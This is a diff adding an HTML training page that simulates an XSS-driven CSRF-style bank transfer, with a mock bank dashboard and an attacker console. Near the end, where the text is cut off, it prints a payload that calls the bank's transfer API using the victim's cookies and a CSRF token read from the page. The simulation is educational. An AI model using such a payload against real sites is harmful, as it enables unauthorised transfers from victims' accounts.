@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔐 Security Awareness: CSRF / On-Behalf Attack Demo</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f1117; color: #e2e8f0; min-height: 100vh; }
+
+  /* ── INTRO ── */
+  #intro-banner {
+    position: fixed; inset: 0; z-index: 9999;
+    background: #0f1117;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 18px; padding: 32px; text-align: center;
+  }
+  .badge { background: #f59e0b; color: #1a1a1a; font-size: 11px; font-weight: 800; letter-spacing: 2px; padding: 4px 14px; border-radius: 20px; display: inline-block; }
+  #intro-banner h1 { font-size: clamp(24px, 5vw, 40px); font-weight: 700; color: #fff; }
+  #intro-banner p { color: #94a3b8; max-width: 560px; line-height: 1.7; font-size: 15px; }
+  .warning-box { background: rgba(245,158,11,.07); border: 1px solid rgba(245,158,11,.35); border-radius: 10px; padding: 14px 20px; font-size: 13px; color: #fcd34d; max-width: 500px; line-height: 1.6; }
+  .btn-start { background: #f59e0b; color: #1a1a1a; border: none; padding: 14px 36px; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; transition: background .2s; }
+  .btn-start:hover { background: #d97706; }
+  .intro-meta { font-size: 12px; color: #4a5568; }
+
+  /* ── TABS (Two browser windows) ── */
+  #sim-wrapper { display: none; flex-direction: column; min-height: 100vh; }
+
+  .browser-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    flex: 1;
+    gap: 0;
+  }
+
+  /* Browser chrome */
+  .browser-chrome {
+    display: flex;
+    flex-direction: column;
+    border: 2px solid #2a2a3a;
+  }
+  .browser-chrome.attacker-browser { border-color: #7f1d1d; }
+
+  .browser-bar {
+    background: #1e1e2e; padding: 8px 14px;
+    display: flex; align-items: center; gap: 10px;
+    border-bottom: 1px solid #2a2a3a;
+  }
+  .browser-dots { display: flex; gap: 5px; }
+  .browser-dots span { width: 10px; height: 10px; border-radius: 50%; }
+  .dot-r { background: #f38ba8; }
+  .dot-y { background: #f9e2af; }
+  .dot-g { background: #a6e3a1; }
+  .url-bar {
+    flex: 1; background: #313244; border-radius: 5px;
+    padding: 4px 12px; font-family: monospace; font-size: 12px; color: #cdd6f4;
+  }
+  .url-bar.evil { background: #3b1010; color: #fca5a5; }
+  .url-bar .lock { color: #a6e3a1; margin-right: 6px; font-size: 11px; }
+  .url-bar .lock.evil-lock { color: #f38ba8; }
+  .tab-label { font-size: 11px; color: #6c7086; white-space: nowrap; }
+  .tab-label.evil { color: #f38ba8; }
+
+  .browser-content { flex: 1; overflow-y: auto; }
+
+  /* ── BANK SITE (left) ── */
+  #bank-site { background: #f0fdf4; color: #14532d; min-height: 100%; }
+  .bank-nav { background: #16a34a; padding: 0 24px; height: 52px; display: flex; align-items: center; gap: 16px; }
+  .bank-logo { font-size: 16px; font-weight: 800; color: #fff; letter-spacing: -0.5px; }
+  .bank-nav-links { display: flex; gap: 16px; margin-left: 16px; }
+  .bank-nav-links a { font-size: 13px; color: rgba(255,255,255,.75); text-decoration: none; }
+  .bank-nav-right { margin-left: auto; display: flex; align-items: center; gap: 10px; }
+  .bank-avatar { width: 30px; height: 30px; border-radius: 50%; background: #bbf7d0; color: #15803d; font-size: 12px; font-weight: 700; display: flex; align-items: center; justify-content: center; }
+  .bank-user { font-size: 12px; color: rgba(255,255,255,.8); }
+  .session-pill { background: #dcfce7; border: 1px solid #86efac; border-radius: 20px; padding: 2px 10px; font-size: 11px; color: #15803d; font-weight: 600; display: flex; align-items: center; gap: 5px; }
+  .session-pill::before { content: '●'; color: #22c55e; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+  .bank-body { padding: 24px; }
+  .account-card { background: #fff; border: 1px solid #bbf7d0; border-radius: 12px; padding: 20px 24px; margin-bottom: 20px; box-shadow: 0 1px 4px rgba(0,0,0,.05); }
+  .account-card .ac-label { font-size: 11px; color: #64748b; font-weight: 600; text-transform: uppercase; letter-spacing: .5px; margin-bottom: 4px; }
+  .account-card .ac-number { font-size: 13px; color: #64748b; font-family: monospace; margin-bottom: 12px; }
+  .account-card .ac-balance { font-size: 32px; font-weight: 800; color: #15803d; }
+  .account-card .ac-sub { font-size: 12px; color: #86efac; margin-top: 2px; }
+
+  .txn-list { background: #fff; border: 1px solid #bbf7d0; border-radius: 12px; overflow: hidden; margin-bottom: 16px; }
+  .txn-header { padding: 14px 20px; font-size: 13px; font-weight: 700; color: #15803d; border-bottom: 1px solid #dcfce7; }
+  .txn-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; border-bottom: 1px solid #f0fdf4; font-size: 13px; }
+  .txn-item:last-child { border-bottom: none; }
+  .txn-item .ti-left .ti-name { color: #1e293b; font-weight: 500; }
+  .txn-item .ti-left .ti-date { font-size: 11px; color: #94a3b8; margin-top: 2px; }
+  .txn-item .ti-amt { font-weight: 700; }
+  .ti-amt.debit { color: #dc2626; }
+  .ti-amt.credit { color: #16a34a; }
+
+  /* CSRF Tokens visible in DOM */
+  .token-box {
+    background: #f0fdf4; border: 1px dashed #86efac;
+    border-radius: 8px; padding: 10px 14px; font-family: monospace;
+    font-size: 11px; color: #4b5563; margin-bottom: 16px;
+  }
+  .token-box .tb-label { color: #94a3b8; margin-bottom: 4px; font-size: 10px; }
+  .token-box .tb-val { color: #16a34a; word-break: break-all; }
+
+  /* Cookie display */
+  .cookie-strip {
+    background: #ecfdf5; border-top: 2px dashed #86efac;
+    padding: 8px 16px; font-family: monospace; font-size: 11px;
+    color: #4b5563; display: flex; gap: 16px; flex-wrap: wrap;
+  }
+  .cookie-strip .ck { color: #64748b; }
+  .cookie-strip .cv { color: #15803d; font-weight: 600; }
+
+  /* ── ATTACKER SITE (right) ── */
+  #attacker-site { background: #0a0a0a; color: #e2e8f0; min-height: 100%; display: flex; flex-direction: column; }
+
+  .attacker-header { padding: 20px 24px 0; }
+  .attacker-header h2 { font-size: 14px; font-weight: 700; color: #f59e0b; letter-spacing: 1px; font-family: monospace; margin-bottom: 4px; }
+  .attacker-header p { font-size: 12px; color: #4a5568; font-family: monospace; }
+
+  .attack-controls { padding: 16px 24px; border-bottom: 1px solid #1a1a1a; }
+  .ctrl-label { font-size: 11px; color: #4a5568; font-family: monospace; margin-bottom: 10px; letter-spacing: .5px; }
+  .payload-box { background: #111; border: 1px solid #1e1e1e; border-radius: 8px; padding: 12px 14px; font-family: monospace; font-size: 12px; color: #a6e3a1; line-height: 1.7; margin-bottom: 12px; }
+  .payload-box .ph { color: #6c7086; }
+  .payload-box .pk { color: #89b4fa; }
+  .payload-box .pv { color: #f9e2af; }
+  .payload-box .ps { color: #f38ba8; }
+  .payload-box .pn { color: #cba6f7; }
+
+  .amount-input-row { display: flex; gap: 8px; align-items: center; margin-bottom: 10px; }
+  .amount-input-row label { font-size: 11px; color: #4a5568; font-family: monospace; white-space: nowrap; }
+  .amount-input-row input {
+    background: #111; border: 1px solid #2a2a2a; border-radius: 5px;
+    padding: 6px 10px; color: #f9e2af; font-family: monospace; font-size: 13px;
+    width: 100px; outline: none;
+  }
+  .amount-input-row input:focus { border-color: #f59e0b; }
+
+  .attack-btn {
+    width: 100%; padding: 10px;
+    background: #7f1d1d; border: 1px solid #f38ba8;
+    color: #fca5a5; font-family: monospace; font-size: 13px; font-weight: 700;
+    border-radius: 6px; cursor: pointer; transition: background .2s;
+    letter-spacing: .5px;
+  }
+  .attack-btn:hover { background: #991b1b; }
+  .attack-btn:disabled { opacity: .4; cursor: not-allowed; }
+
+  /* Request/Response log */
+  .req-log { flex: 1; padding: 16px 24px; overflow-y: auto; }
+  .req-log-title { font-size: 11px; color: #4a5568; font-family: monospace; letter-spacing: .5px; margin-bottom: 10px; }
+  .log-entry { background: #0d0d0d; border: 1px solid #1a1a1a; border-radius: 8px; margin-bottom: 10px; overflow: hidden; font-family: monospace; font-size: 12px; }
+  .log-entry-head { padding: 8px 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1a1a1a; }
+  .log-method { background: #f59e0b; color: #000; font-size: 10px; font-weight: 800; padding: 2px 7px; border-radius: 3px; }
+  .log-method.get { background: #3b82f6; color: #fff; }
+  .log-url { color: #89b4fa; font-size: 11px; }
+  .log-status { font-size: 11px; }
+  .log-status.ok { color: #a6e3a1; }
+  .log-status.pending { color: #f9e2af; }
+  .log-body { padding: 10px 12px; line-height: 1.7; color: #cdd6f4; font-size: 11px; }
+  .log-body .lk { color: #89b4fa; }
+  .log-body .lv { color: #f9e2af; }
+  .log-body .lv.danger { color: #f38ba8; }
+  .log-body .lv.ok { color: #a6e3a1; }
+  .log-comment { color: #4a5568; }
+
+  /* Timeline / steps */
+  .attack-timeline { padding: 0 24px 16px; }
+  .tl-title { font-size: 11px; color: #4a5568; font-family: monospace; margin-bottom: 10px; }
+  .tl-step { display: flex; gap: 10px; margin-bottom: 8px; align-items: flex-start; }
+  .tl-num { min-width: 20px; height: 20px; border-radius: 50%; background: #1a1a1a; border: 1px solid #2a2a2a; color: #6c7086; font-size: 10px; font-family: monospace; display: flex; align-items: center; justify-content: center; margin-top: 1px; }
+  .tl-num.done { background: #f59e0b; color: #000; border-color: #f59e0b; }
+  .tl-num.active { background: #1a1a1a; border-color: #f59e0b; color: #f9e2af; animation: tl-pulse 1s infinite; }
+  @keyframes tl-pulse { 0%,100%{border-color:#f59e0b} 50%{border-color:#4a5568} }
+  .tl-text { font-size: 12px; color: #6c7086; font-family: monospace; line-height: 1.5; padding-top: 2px; }
+  .tl-text.done { color: #a6e3a1; }
+  .tl-text.active { color: #f9e2af; }
+
+  /* ── Balance update animation on bank side ── */
+  .balance-flash { animation: flash-red .6s ease; }
+  @keyframes flash-red { 0%,100%{background:transparent} 50%{background:rgba(220,38,38,.15)} }
+
+  /* ── REVEAL PANEL ── */
+  #reveal-panel { display: none; position: fixed; inset: 0; z-index: 9000; background: #0f1117; overflow-y: auto; padding: 40px 20px; }
+  .reveal-inner { max-width: 820px; margin: 0 auto; }
+  .reveal-inner h2 { font-size: 28px; font-weight: 700; margin-bottom: 8px; color: #f8fafc; }
+  .reveal-inner .sub { color: #94a3b8; margin-bottom: 28px; font-size: 14px; }
+
+  .captured-box { background: #1a1000; border: 1px solid #f59e0b; border-radius: 12px; padding: 20px 24px; margin-bottom: 28px; }
+  .captured-box h3 { color: #f59e0b; font-size: 12px; letter-spacing: 1px; margin-bottom: 16px; font-family: monospace; }
+  .kv { display: flex; gap: 12px; margin-bottom: 10px; font-size: 14px; }
+  .kv .k { color: #94a3b8; min-width: 160px; font-size: 12px; }
+  .kv .v { color: #f8fafc; font-family: monospace; word-break: break-all; }
+  .kv .v.danger { color: #fbbf24; }
+  .kv .v.ok { color: #a6e3a1; }
+
+  .code-block { background: #1e1e2e; border-radius: 10px; padding: 18px 20px; font-family: monospace; font-size: 13px; color: #cdd6f4; overflow-x: auto; margin-bottom: 16px; border: 1px solid #313244; line-height: 1.8; }
+  .c-green { color: #a6e3a1; } .c-blue { color: #89b4fa; } .c-yellow { color: #f9e2af; }
+  .c-red { color: #f38ba8; } .c-gray { color: #6c7086; } .c-purple { color: #cba6f7; } .c-amber { color: #f59e0b; }
+
+  .steps { counter-reset: step; list-style: none; }
+  .steps li { counter-increment: step; position: relative; padding: 0 0 22px 48px; }
+  .steps li::before { content: counter(step); position: absolute; left: 0; top: 0; width: 30px; height: 30px; border-radius: 50%; background: #f59e0b; color: #000; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 800; }
+  .steps li h4 { font-size: 15px; font-weight: 600; margin-bottom: 5px; color: #f8fafc; }
+  .steps li p { font-size: 13px; color: #94a3b8; line-height: 1.6; }
+
+  .defenses { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin-top: 16px; }
+  .def-card { background: #0d1a0d; border: 1px solid #1a3a1a; border-radius: 10px; padding: 16px; }
+  .def-card .icon { font-size: 22px; margin-bottom: 8px; }
+  .def-card h4 { font-size: 14px; font-weight: 600; color: #86efac; margin-bottom: 4px; }
+  .def-card p { font-size: 12px; color: #64748b; line-height: 1.5; }
+
+  .section-title { font-size: 16px; font-weight: 700; color: #f8fafc; margin: 28px 0 14px; }
+  .btn-restart { margin-top: 28px; background: #f59e0b; color: #000; border: none; padding: 12px 28px; border-radius: 8px; font-size: 14px; font-weight: 700; cursor: pointer; }
+
+  .vs-table { width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 8px; }
+  .vs-table th { text-align: left; padding: 8px 14px; color: #64748b; font-size: 11px; font-weight: 600; border-bottom: 1px solid #1e293b; }
+  .vs-table td { padding: 10px 14px; border-bottom: 1px solid #1a1a2a; }
+  .vs-table .good { color: #a6e3a1; }
+  .vs-table .bad { color: #f38ba8; }
+
+  @media (max-width: 700px) {
+    .browser-row { grid-template-columns: 1fr; }
+    .bank-nav-links { display: none; }
+  }
+
+  #intro-banner > *:not(.cyber-bg), #reveal-panel > *:not(.cyber-bg) {
+    position: relative;
+    z-index: 1;
+  }
+
+/* ---------- DYNAMIC CYBER BACKGROUND ---------- */
+  .cyber-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+
+  /* Matrix Dot Grid Overlay with continuous slow drift */
+  .cyber-grid {
+    position: absolute;
+    inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    -webkit-mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    opacity: 0.85;
+    animation: gridDrift 60s linear infinite;
+  }
+  :root[data-theme="light"] .cyber-grid {
+    background-image: 
+      radial-gradient(rgba(15, 23, 42, 0.08) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    opacity: 0.6;
+  }
+
+  @keyframes gridDrift {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(96px, 96px); }
+  }
+
+  /* Ambient Glowing Floating Orbs */
+  .cyber-orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(100px);
+    opacity: 0.35;
+    will-change: transform;
+  }
+  :root[data-theme="light"] .cyber-orb {
+    opacity: 0.18;
+    filter: blur(110px);
+  }
+
+  .orb-1 {
+    width: 650px;
+    height: 650px;
+    background: radial-gradient(circle, #6366f1 0%, rgba(99,102,241,0) 70%);
+    top: -120px;
+    left: -100px;
+    animation: floatOrb1 16s ease-in-out infinite alternate;
+  }
+
+  .orb-2 {
+    width: 700px;
+    height: 700px;
+    background: radial-gradient(circle, #a855f7 0%, rgba(168,85,247,0) 70%);
+    top: 15%;
+    right: -150px;
+    animation: floatOrb2 20s ease-in-out infinite alternate;
+  }
+
+  .orb-3 {
+    width: 560px;
+    height: 560px;
+    background: radial-gradient(circle, #06b6d4 0%, rgba(6,182,212,0) 70%);
+    bottom: -80px;
+    left: 15%;
+    animation: floatOrb3 18s ease-in-out infinite alternate;
+  }
+
+  .orb-4 {
+    width: 500px;
+    height: 500px;
+    background: radial-gradient(circle, #f43f5e 0%, rgba(244,63,94,0) 70%);
+    bottom: 18%;
+    right: 12%;
+    animation: floatOrb4 22s ease-in-out infinite alternate;
+  }
+
+  /* Keyframe Animations for Smooth Floating */
+  @keyframes floatOrb1 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(120px, 90px) scale(1.15); }
+    100% { transform: translate(-60px, 140px) scale(0.92); }
+  }
+
+  @keyframes floatOrb2 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-140px, 110px) scale(1.18); }
+    100% { transform: translate(-80px, -70px) scale(0.9); }
+  }
+
+  @keyframes floatOrb3 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(90px, -100px) scale(1.14); }
+    100% { transform: translate(-100px, -50px) scale(1.05); }
+  }
+
+  @keyframes floatOrb4 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-110px, -80px) scale(1.2); }
+    100% { transform: translate(90px, 70px) scale(0.9); }
+  }
+
+  /* Floating Cyber Data Particles */
+  .cyber-particle {
+    position: absolute;
+    border-radius: 50%;
+    background: #fff;
+    box-shadow: 0 0 8px currentColor;
+    opacity: 0;
+    animation: floatParticle 14s infinite ease-in-out;
+  }
+
+  .p-1 { width: 3px; height: 3px; left: 12%; bottom: -20px; color: var(--brand-1); animation-delay: 0s; animation-duration: 15s; }
+  .p-2 { width: 4px; height: 4px; left: 28%; bottom: -20px; color: var(--brand-2); animation-delay: 3s; animation-duration: 18s; }
+  .p-3 { width: 3px; height: 3px; left: 48%; bottom: -20px; color: var(--safe); animation-delay: 6s; animation-duration: 14s; }
+  .p-4 { width: 4px; height: 4px; left: 68%; bottom: -20px; color: var(--danger); animation-delay: 2s; animation-duration: 20s; }
+  .p-5 { width: 3px; height: 3px; left: 84%; bottom: -20px; color: var(--accent); animation-delay: 7s; animation-duration: 16s; }
+  .p-6 { width: 4px; height: 4px; left: 94%; bottom: -20px; color: #38bdf8; animation-delay: 4s; animation-duration: 19s; }
+  .p-7 { width: 3px; height: 3px; left: 38%; bottom: -20px; color: var(--safe); animation-delay: 9s; animation-duration: 17s; }
+  .p-8 { width: 4px; height: 4px; left: 58%; bottom: -20px; color: var(--brand-2); animation-delay: 11s; animation-duration: 21s; }
+
+  @keyframes floatParticle {
+    0% { transform: translateY(0) translateX(0) scale(0.5); opacity: 0; }
+    15% { opacity: 0.8; }
+    85% { opacity: 0.8; }
+    100% { transform: translateY(-105vh) translateX(50px) scale(1.2); opacity: 0; }
+  }
+
+  /* Scanline sweep effect */
+  .cyber-scanline {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(180deg, transparent 0%, rgba(99, 102, 241, 0.035) 50%, transparent 100%);
+    background-size: 100% 200%;
+    animation: scanSweep 12s linear infinite;
+  }
+
+  @keyframes scanSweep {
+    0% { background-position: 0% 0%; }
+    100% { background-position: 0% 200%; }
+  }
+
+
+  /* ── Moving Interactive Pipeline Stream (Visual Motion) ── */
+  .flow-stream-bar {
+    background: rgba(17, 24, 39, 0.7);
+    border: 1px solid var(--border, #374151);
+    border-radius: 10px;
+    padding: 12px 18px;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+    overflow: hidden;
+  }
+  .flow-stream-bar::after {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%; height: 2px;
+    background: linear-gradient(90deg, transparent, #38bdf8, #ef4444, transparent);
+    animation: pipelineLaser 3s linear infinite;
+  }
+  @keyframes pipelineLaser {
+    0% { left: -60%; }
+    100% { left: 140%; }
+  }
+
+  .flow-step-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono, monospace);
+    font-size: 12px;
+    color: var(--text-muted, #9ca3af);
+    transition: all 0.3s;
+  }
+  .flow-step-item.active {
+    color: #38bdf8;
+    text-shadow: 0 0 10px rgba(56, 189, 248, 0.4);
+  }
+  .flow-step-item.attacked {
+    color: #f87171;
+    text-shadow: 0 0 10px rgba(239, 68, 68, 0.6);
+  }
+  .flow-dot-pulse {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #3b82f6;
+    animation: dotPulse 1.5s infinite alternate;
+  }
+  .flow-step-item.attacked .flow-dot-pulse {
+    background: #ef4444;
+    animation: dotPulseRed 0.8s infinite alternate;
+  }
+  @keyframes dotPulse {
+    0% { transform: scale(0.8); opacity: 0.5; }
+    100% { transform: scale(1.4); opacity: 1; box-shadow: 0 0 8px #3b82f6; }
+  }
+  @keyframes dotPulseRed {
+    0% { transform: scale(0.8); opacity: 0.6; }
+    100% { transform: scale(1.6); opacity: 1; box-shadow: 0 0 12px #ef4444; }
+  }
+  .flow-connector {
+    color: #4b5563;
+    font-weight: 700;
+    font-size: 13px;
+  }
+
+  /* Live Bouncing Waveform Monitor */
+  .parser-heartbeat {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #080c14;
+    border: 1px solid var(--border, #374151);
+    border-radius: 6px;
+    padding: 8px 12px;
+    margin-top: 14px;
+    font-family: var(--mono, monospace);
+    font-size: 11px;
+    color: #94a3b8;
+  }
+  .wave-bars {
+    display: flex;
+    align-items: flex-end;
+    gap: 3px;
+    height: 14px;
+  }
+  .wave-bar {
+    width: 3px;
+    background: #3b82f6;
+    border-radius: 1px;
+    animation: waveBounce 1s ease-in-out infinite alternate;
+  }
+  .wave-bar:nth-child(2) { animation-delay: 0.2s; }
+  .wave-bar:nth-child(3) { animation-delay: 0.4s; }
+  .wave-bar:nth-child(4) { animation-delay: 0.6s; }
+  @keyframes waveBounce {
+    0% { height: 3px; }
+    100% { height: 14px; background: #ef4444; }
+  }
+
+  .term-cursor {
+    display: inline-block;
+    width: 7px;
+    height: 14px;
+    background: #a3e635;
+    vertical-align: middle;
+    margin-left: 4px;
+    animation: blinkCursor 0.9s step-end infinite;
+  }
+  @keyframes blinkCursor {
+    50% { opacity: 0; }
+  }
+
+
+  /* ── Standard Modern Footer ── */
+  .modern-footer { padding: 40px 18px 30px; text-align: center; position: relative; z-index: 1; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, #1f2937, #111827);
+    padding: 12px 28px; border-radius: 30px; font-family: 'IBM Plex Mono', monospace; font-size: 13.5px;
+    color: #9ca3af; border: 1px solid #374151;
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25); cursor: default;
+  }
+  .footer-badge:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 30px rgba(239, 68, 68, 0.25);
+    border-color: #ef4444;
+    color: #f9fafb;
+  }
+  .dev-name {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    background-size: 200% auto;
+    animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+
+
+  /* ── Back to Notes Navigation Link ── */
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    background: var(--panel, #111827);
+    border: 1px solid var(--border, #374151);
+    border-radius: 8px;
+    color: var(--text-muted, #9ca3af);
+    font-family: var(--mono, monospace);
+    font-size: 13px;
+    text-decoration: none;
+    transition: all 0.2s;
+  }
+  .back-link:hover {
+    color: var(--text, #f9fafb);
+    border-color: var(--accent, #f59e0b);
+    transform: translateX(-3px);
+  }
+
+</style>
+</head>
+<body>
+
+<!-- ═══ PHASE 0 – INTRO ═══ -->
+<div id="intro-banner">
+<!-- ================= DYNAMIC CYBER BACKGROUND ================= -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+  <div class="cyber-scanline"></div>
+  <div class="cyber-particle p-1"></div>
+  <div class="cyber-particle p-2"></div>
+  <div class="cyber-particle p-3"></div>
+  <div class="cyber-particle p-4"></div>
+  <div class="cyber-particle p-5"></div>
+  <div class="cyber-particle p-6"></div>
+  <div class="cyber-particle p-7"></div>
+  <div class="cyber-particle p-8"></div>
+</div>
+
+
+  <div style="margin-bottom: 20px;"><a href="../guides/XSS.html" class="back-link">← Back to XSS Notes</a></div>
+  <div class="badge">🛡 SECURITY AWARENESS TRAINING</div>
+  <h1>On-Behalf Actions<br><span style="font-size:.6em;color:#94a3b8;font-weight:400">CSRF-style Attack via XSS</span></h1>
+  <p>Attacker ko aapki cookie churane ki zaroorat nahi. Uska script <em>aapke browser ke andar</em> bank API ko direct request bhejta hai — cookies automatically attach ho jaati hain, aur CSRF token bhi JS se padha ja sakta hai.</p>
+  <div class="warning-box">
+    ⚠️ <strong>Educational use only.</strong> Koi real transfer nahi hota. Simulation poora browser ke andar hai — koi server nahi.
+  </div>
+  <button class="btn-start" onclick="startSim()">▶ Simulation Shuru Karo</button>
+  <div class="intro-meta">Two browser windows dikhenge: Bank site (left) + Attacker's script (right)</div>
+</div>
+
+<!-- ═══ PHASE 1 – DUAL BROWSER VIEW ═══ -->
+<div id="sim-wrapper">
+  <div style="max-width: 1200px; margin: 0 auto 16px; display: flex; justify-content: space-between; align-items: center;">
+    <a href="../guides/XSS.html" class="back-link">← Back to XSS Notes</a>
+    <span style="font-family: 'IBM Plex Mono', monospace; font-size: 12px; color: #a855f7; font-weight:600;">● ACTIVE SIMULATION</span>
+  </div>
+  <div class="browser-row">
+
+    <!-- LEFT: Victim's Bank Tab -->
+    <div class="browser-chrome">
+      <div class="browser-bar">
+        <div class="browser-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <div class="url-bar"><span class="lock">🔒</span>https://securenet-bank.in/dashboard</div>
+        <div class="tab-label">SecureNet Bank — Dashboard</div>
+      </div>
+      <div class="browser-content">
+        <div id="bank-site">
+          <div class="bank-nav">
+            <div class="bank-logo">🏦 SecureNet</div>
+            <div class="bank-nav-links">
+              <a href="#">Dashboard</a>
+              <a href="#">Transfer</a>
+              <a href="#">History</a>
+            </div>
+            <div class="bank-nav-right">
+              <div class="bank-avatar">OB</div>
+              <div class="bank-user">om.bobde@gmail.com</div>
+              <div class="session-pill">Session Active</div>
+            </div>
+          </div>
+
+          <div class="bank-body">
+            <div class="account-card">
+              <div class="ac-label">Savings Account — Om Bobde</div>
+              <div class="ac-number">ACNO: XXXX-XXXX-4821</div>
+              <div class="ac-balance" id="bank-balance">₹1,24,500.00</div>
+              <div class="ac-sub" id="balance-sub">Available Balance</div>
+            </div>
+
+            <!-- CSRF token visible in DOM — readable by JS -->
+            <div class="token-box">
+              <div class="tb-label">// Hidden input — CSRF Token (readable by any JS on this page)</div>
+              <div class="tb-val" id="csrf-token-display">csrf_token = <span id="csrf-val">loading...</span></div>
+            </div>
+
+            <!-- Cookie bar -->
+            <div class="cookie-strip">
+              <span><span class="ck">session_id:</span> <span class="cv" id="cookie-val">loading...</span></span>
+              <span><span class="ck">auth_token:</span> <span class="cv">eyJhbGci...Om_Bobde</span></span>
+              <span><span class="ck">HttpOnly:</span> <span class="ck">false ⚠️</span></span>
+            </div>
+
+            <div class="txn-list">
+              <div class="txn-header">Recent Transactions</div>
+              <div class="txn-item">
+                <div class="ti-left"><div class="ti-name">Salary — Wipro Ltd</div><div class="ti-date">31 Aug 2026</div></div>
+                <div class="ti-amt credit">+₹85,000</div>
+              </div>
+              <div class="txn-item">
+                <div class="ti-left"><div class="ti-name">Rent — MG Society</div><div class="ti-date">28 Aug 2026</div></div>
+                <div class="ti-amt debit">−₹18,000</div>
+              </div>
+              <div class="txn-item">
+                <div class="ti-left"><div class="ti-name">Electricity Bill</div><div class="ti-date">25 Aug 2026</div></div>
+                <div class="ti-amt debit">−₹2,400</div>
+              </div>
+              <div id="attack-txn" style="display:none" class="txn-item">
+                <div class="ti-left"><div class="ti-name" style="color:#dc2626">⚠ Transfer — HACKER_ACC_9911</div><div class="ti-date" id="attack-txn-time"></div></div>
+                <div class="ti-amt debit" id="attack-txn-amt"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT: Attacker's Script Tab -->
+    <div class="browser-chrome attacker-browser">
+      <div class="browser-bar">
+        <div class="browser-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <div class="url-bar evil"><span class="lock evil-lock">⚠</span>https://evil-scripts.net/payload.js (injected)</div>
+        <div class="tab-label evil">Attacker Console</div>
+      </div>
+      <div class="browser-content" style="display:flex;flex-direction:column;height:100%;background:#0a0a0a;">
+
+        <div class="attacker-header">
+          <h2>// CSRF-STYLE PAYLOAD — XSS INJECTED</h2>
+          <p>Running inside victim's browser · same origin · cookies auto-attached</p>
+        </div>
+
+        <div class="attack-controls">
+          <div class="ctrl-label">// PAYLOAD CONFIGURATION</div>
+          <div class="payload-box">
+            <span class="ph">fetch(</span><span class="ps">'https://securenet-bank.in/api/transfer'</span><span class="ph">, {</span><br>
+            &nbsp;&nbsp;<span class="pk">method:</span> <span class="pv">'POST'</span>,<br>
+            &nbsp;&nbsp;<span class="pk">credentials:</span> <span class="pv">'include'</span>, <span class="ph">// cookies auto-attach</span><br>
+            &nbsp;&nbsp;<span class="pk">headers:</span> { <span class="ps">'X-CSRF-Token'</span>: <span class="pn">readTokenFromDOM()</span> },<br>
